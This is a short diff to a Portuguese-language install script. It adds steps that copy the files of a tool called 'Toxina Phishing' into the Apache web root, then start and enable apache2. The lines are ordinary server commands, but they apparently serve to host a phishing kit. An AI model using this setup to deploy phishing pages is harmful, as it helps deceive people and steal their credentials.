@@ -86,6 +86,13 @@ fi
 $c
 echo "[**Dependências baixadas com sucesso**]"
 $c
+echo "[**Movendo o Toxina Phishing para o apache2**]"
+mkdir /var/www/html/page
+cp -r * /var/www/html/page
+systemctl start apache2
+systemctl enable apache2.service
+echo "[**Toxina Ph1shing movido com sucesso!**]"
+
 sudo apt-get update -y && sudo apt-get full-upgrade -y
 sudo apt-get autoremove -y
 $c
